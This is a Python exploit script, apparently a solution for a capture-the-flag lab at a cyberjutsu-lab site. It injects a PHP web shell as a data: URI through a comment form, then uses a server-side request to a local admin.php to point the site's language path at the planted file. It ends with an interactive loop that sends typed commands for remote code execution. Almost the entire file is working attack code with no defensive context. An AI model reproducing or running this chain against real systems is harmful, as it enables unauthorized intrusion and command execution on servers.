import requests

url = "http://magazin.cyberjutsu-lab.tech:8093/"
comment="sheng"
command_inject="data:,"+"<?php echo shell_exec($_GET['cmd']);?>"

#--------------------------------inject code
cookies = {"PHPSESSID": "ee439dcdabac70c1862e238c1384e3af", "lang": "en.html"}
headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://magazin.cyberjutsu-lab.tech:8093", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary4xlJnMgsgdOygnNd", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://magazin.cyberjutsu-lab.tech:8093/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
data = "------WebKitFormBoundary4xlJnMgsgdOygnNd\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\n{}\r\n------WebKitFormBoundary4xlJnMgsgdOygnNd\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n{}\r\n------WebKitFormBoundary4xlJnMgsgdOygnNd--\r\n".format(comment,command_inject)
response=requests.post(url, headers=headers, cookies=cookies, data=data)
response=response.text.split('<img class="img-responsive thumbnail" src="')[-1]
response=response.split('"')[0]
#print(response)

#----------------------------------update lang_path
payload="http://127.0.0.1/admin.php?name=lang_path&value=./"+response
cookies = {"PHPSESSID": "ee439dcdabac70c1862e238c1384e3af", "lang": "en.html"}
headers = {"Cache-Control": "max-age=0", "sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "http://magazin.cyberjutsu-lab.tech:8093", "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundary4xlJnMgsgdOygnNd", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "http://magazin.cyberjutsu-lab.tech:8093/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
data = "------WebKitFormBoundary4xlJnMgsgdOygnNd\r\nContent-Disposition: form-data; name=\"comment\"\r\n\r\n{}\r\n------WebKitFormBoundary4xlJnMgsgdOygnNd\r\nContent-Disposition: form-data; name=\"url\"\r\n\r\n{}\r\n------WebKitFormBoundary4xlJnMgsgdOygnNd--\r\n".format(comment,payload)
response=requests.post(url, headers=headers, cookies=cookies, data=data)
#print(response.text)

#--------------------------------RCE
cookies = {"PHPSESSID": "ee439dcdabac70c1862e238c1384e3af", "lang": "en.html"}
headers = {"sec-ch-ua": "\"-Not.A/Brand\";v=\"8\", \"Chromium\";v=\"102\"", "sec-ch-ua-mobile": "?0", "sec-ch-ua-platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
print("Type something: ")
while 1:    
    url = "http://magazin.cyberjutsu-lab.tech:8093/?cmd={}".format(input())
    data=requests.get(url, headers=headers, cookies=cookies)
    data=data.text.split('<body>')[1]
    data=data.split("<div")[0]
    print(data)